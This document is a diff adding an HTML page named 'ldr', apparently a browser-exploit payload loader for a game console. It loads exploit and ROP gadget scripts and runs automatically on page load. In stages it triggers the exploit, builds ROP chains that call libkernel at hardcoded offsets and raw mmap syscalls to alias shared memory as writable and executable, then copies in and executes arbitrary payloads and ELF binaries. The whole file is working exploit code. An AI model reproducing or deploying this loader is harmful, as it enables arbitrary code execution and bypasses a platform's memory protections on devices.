@@ -1,0 +1,238 @@
+<html>
+	<head>
+		<meta charset='utf-8'>
+
+		<title>ldr</title>
+
+		<script type='text/javascript' src='js/utils.js'></script>
+		<script type='text/javascript' src='js/exploit.js'></script>
+		<script type='text/javascript' src='js/just-rop.js'></script>
+		<script type='text/javascript' src='js/gadgets.js'></script>
+		<script type='text/javascript' src='ldr/ldr.js'></script>
+
+		<script type='text/javascript'>
+			var loopOnExit = true;
+
+			var debug = 3;
+			var debugWait = 4000;
+
+			function searchURIToObject(searchURI)
+			{
+				var a = searchURI.substr(1).split('&');
+				if(a.length == 0)
+					return {};
+			    var b = {};
+			    for(var i = 0; i < a.length; ++i)
+			    {
+			        var p = a[i].split('=', 2);
+					if(p == null || p[0] == '' || p.length == 0)
+						continue;
+
+					if(p.length == 1)
+			            b[p[0]] = '';
+					else
+					{
+						var n = parseInt(p[1]);
+						if(n == p[1])
+							b[p[0]] = n;
+						else
+							b[p[0]] = decodeURIComponent(p[1]);//.replace(/\+/g, ' '));
+		            		}
+			    }
+			    return b;
+			}
+
+			function objectToSearchURI(obj)
+			{
+				var s = '';
+				for(var key in obj)
+					if(key != null && key != '')
+						s += '&' + encodeURIComponent(key) + '=' + encodeURIComponent(obj[key]);
+				return '?' + s.substr(1);
+			}
+
+			function paramsToString(params)
+			{
+				var s = "";
+				for(var key in params)
+					if(key != 'stage')
+						s += key + ': 0x' + params[key].toString(16) + ' ';
+				return s;
+			}
+
+			function nextStage(params)
+			{
+				params['stage'] += 1;
+
+				if(debug > 3)
+				{
+					document.body.innerHTML += 'Stage (End): ' + params['stage'] + '<br>' +
+ 												'Params: ' + paramsToString(params) + '<br>' +
+ 												'As URI (next loc): ' + objectToSearchURI(params) + '<br>' +
+												'Current loc: ' + window.location.search + '<br><br>';
+					setTimeout(function()
+					{
+						window.location.href = window.location.href.split('?')[0] + objectToSearchURI(params);
+					}, debugWait);
+					return;
+				}
+
+				window.location.href = window.location.href.split('?')[0] + objectToSearchURI(params);
+			}
+
+			function ldr()
+			{
+				exploit();
+				var chain = new rop();
+
+				var size = 0x100000;
+				var writeAddress = 0x926100000;
+				var execAddress = 0x926200000;
+				var dataAddress = 0x926300000;
+				var dataSegmentCount = 3;
+
+				var params = searchURIToObject(window.location.search);
+
+				if(params['stage'] == null)
+					params['stage'] = 0;
+
+				params['syscall'] = gadgets["mov r10, rcx; syscall"].address();
+
+				if(debug > 2)
+					document.body.innerHTML += 'Stage (Begin): ' + params['stage'] + '<br>' +
+												'Params: ' + paramsToString(params) + '<br>' +
+												'As URI (next loc): ' + objectToSearchURI(params) + '<br>' +
+												'Current loc: ' + window.location.search + '<br><br>';
+
+				switch(params['stage'])
+				{
+					case 0:
+						chain.call('createSharedMemory', LIBKERNEL, 0x15170, 0, size, 1 | 2 | 4, chain.data);
+						chain.execute(function(){ params['eh1'] = getU32from(chain.data); nextStage(params); });
+						break;
+					case 1:
+						chain.call('createSharedMemoryAlias', LIBKERNEL, 0x151c0, params['eh1'], 1 | 2, chain.data);
+						chain.execute(function(){ params['wh1'] = getU32from(chain.data); nextStage(params); });
+						break;
+					case 2:
+						//chain.call('mapSharedMemory', LIBKERNEL, 0x15210, params['wh1'], 1 | 2, chain.data);
+						//chain.execute(function(){ params['wa1'] = getU64from(chain.data); nextStage(params); });
+						//break;
+						chain.syscall('mmap', 477, writeAddress, size, 1 | 2, 0xf | 0x2, params['wh1'], 0);
+						chain.write_rax_ToVariable(0);
+						chain.execute(function(){ params['wa1'] = chain.getVariable(0); nextStage(params); });
+						break;
+					case 3:
+						chain.syscall('mmap', 477, execAddress, size, 1 | 4, 1, params['eh1'], 0);
+						chain.write_rax_ToVariable(0);
+						chain.execute(function(){ params['ea1'] = chain.getVariable(0); nextStage(params); });
+						break;
+					case 4:
+						chain.syscall('mmap', 477, dataAddress, size * dataSegmentCount, 1 | 2, 4096, -1, 0);
+						chain.write_rax_ToVariable(0);
+						chain.execute(function(){ params['da1'] = chain.getVariable(0); nextStage(params); });
+						break;
+					case 5:
+						if(debug > 0)
+							document.body.innerHTML += 'Payload executing (loader listening)<br>';
+						setTimeout(function()
+						{
+							var ldr;
+							ldr = new Ldr();
+
+							/*setBase(params['wa1']);
+							for(i = 0; i < size / 4; i++)
+								u32[i] = 0;*/
+							ldr.writeText(params['wa1']);
+
+							setBase(params['da1']);
+							for(i = 0; i < size / 4; i++)
+								u32[i] = 0;
+							ldr.writeData(params['da1']);
+
+							chain.start(params['ea1'], params['da1']);
+							chain.write_rax_ToVariable(0);
+							chain.execute(function()
+							{
+								params['ret'] = chain.getVariable(0);
+
+								if(debug > 0)
+									document.body.innerHTML += 'Payload executed!<br>'
+								if(debug > 1)
+								{
+									document.body.innerHTML += 'Handles and Addresses are: ';
+									document.body.innerHTML += paramsToString(params) + '<br><br>';
+								}
+								if(!ldr.isElfLoader())
+									nextStage(params);
+								else if(loopOnExit)
+								{
+									params['stage'] = 4;
+									nextStage(params);
+								}
+							});
+						}, 100);
+						break;
+					case 6:
+						/*
+							- text (w)
+							- text (e)
+							- data (d1)
+							- Payload text (d2) -> copy to text (w)
+							- Payload data (d3) -> copy data (d1)
+						*/
+						if(debug > 0)
+							document.body.innerHTML += 'Binary loader (stage 6)!<br>'
+						setTimeout(function()
+						{
+							// text = d2; data = d3;
+							var c = [];
+							setBase(params['da1'] + size);
+							for(i = 0; i < size / 4; i++)
+								c[i] = u32[i];
+							setBase(params['wa1']);
+							for(i = 0; i < size / 4; i++)
+								u32[i] = c[i];
+
+							var d = [];
+							setBase(params['da1'] + 2 * size);
+							for(i = 0; i < size / 4; i++)
+								d[i] = u32[i];
+							setBase(params['da1']);
+							for(i = 0; i < size / 4; i++)
+								u32[i] = d[i];
+
+							chain.start(params['ea1'], params['da1']);
+							chain.write_rax_ToVariable(0);
+							chain.execute(function()
+							{
+								params['ret'] = chain.getVariable(0);
+
+								if(debug > 0)
+									document.body.innerHTML += 'Binary executed!<br>'
+								if(debug > 1)
+								{
+									document.body.innerHTML += 'Handles and Addresses are: ';
+									document.body.innerHTML += paramsToString(params) + '<br><br>';
+								}
+								if(loopOnExit)
+								{
+									params['stage'] = 4;
+									nextStage(params);
+								}
+							});
+						}, 100);
+						break;
+					default:
+						break;
+				}
+			}
+
+		</script>
+	</head>
+	<body style="background-color:#000000;color:#11EE11">
+		<script type='text/javascript'>
+			document.body.onload = ldr;
+		</script>
+	</body>
+</html>
